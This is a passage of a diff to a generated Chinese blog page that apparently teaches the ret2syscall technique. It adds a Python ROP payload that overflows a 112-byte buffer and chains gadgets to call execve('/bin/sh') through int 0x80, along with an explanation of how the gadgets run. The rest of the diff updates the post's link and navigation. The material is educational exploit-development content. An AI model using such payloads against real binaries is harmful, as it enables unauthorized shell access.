4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://smypicture.oss-cn-beijing.aliyuncs.com/img/image-20220513111322877.png" alt="image-20220513111322877"></p>
+<p>那容易了呀，那不就是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_edx_ecx_ebx_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh_adr)+p32(int0x80_adr)</span><br></pre></td></tr></table></figure>
+
+<p>有可能很多小伙伴不知道为什么要<code>pop eax;ret</code>这样的，首先<code>return address</code>为<code>pop eax;ret</code>的地址，那么首先就是执行<code>pop eax;ret</code>，分2步，第一步<code>pop eax</code>，那么就把<code>0xb</code>给<code>eax</code>，然后<code>ret</code>，就会到<code>pop ebx;ret</code>这一个地方，那么后面就一样了，这里大家可以画一个动态图，自己好好理解下</p>
 
       
     </div>
@@ -519,7 +561,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://www.shicoder.top/posts/713527548.html" title="muduo源码分析之muduo简单运用">http://www.shicoder.top/posts/713527548.html</a>
+    <a href="http://www.shicoder.top/posts/850767793.html" title="ret2syscall">http://www.shicoder.top/posts/850767793.html</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>
@@ -561,8 +603,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/posts/620043534.html" rel="next" title="muduo源码分析之Buffer">
-                <i class="fa fa-chevron-left"></i> muduo源码分析之Buffer
+              <a href="/posts/1940886654.html" rel="next" title="操作系统实现-中断及任务调度">
+                <i class="fa fa-chevron-left"></i> 操作系统实现-中断及任务调度
               </a>
             
           </div>
@@ -570,10 +612,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/posts/335272509.html" rel="prev" title="muduo源码分析之TcpServer模块">
-                muduo源码分析之TcpServer模块 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
